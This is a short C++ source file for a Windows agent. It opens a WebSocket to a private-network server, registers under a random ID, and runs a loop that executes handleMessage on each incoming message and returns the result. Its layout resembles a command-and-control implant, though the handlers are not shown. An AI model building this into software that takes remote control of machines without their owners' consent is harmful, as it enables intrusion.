#include "global.hpp"
#include "connection.hpp"
#include "identifier.hpp"
#include <thread>

PVOID getMem();
string handleMessage(string& msg, PVOID mem);

string to_hex(const uint8_t* data, size_t len);
int main() {
    PVOID mem = getMem();
    const wstring host = L"192.168.64.1";
    const INTERNET_PORT port = 443;
    wstring path = L"/api/v1/anon/agent/ws/";
    wstring identifier = random_uuid();
    const bool useHttps = true;
    path += identifier;

    WebSocketClient client;

    if (!connectWebSocket(client, host, port, path, useHttps)) {
        cleanup(client);
        return 1;
    }
    

    while (true) {
        string message;
        if (!receiveText(client.websocket, message)) {
            break;
        }
        string returnstring = handleMessage(message, mem);
        sendText(client.websocket, returnstring);
    }

    DWORD closeResult = WinHttpWebSocketClose(
        client.websocket,
        WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS,
        nullptr,
        0
    );

    if (closeResult != NO_ERROR) {
        cerr << "WinHttpWebSocketClose failed: " << closeResult << endl;
        cleanup(client);
        return 1;
    }

    cleanup(client);
    return 0;
}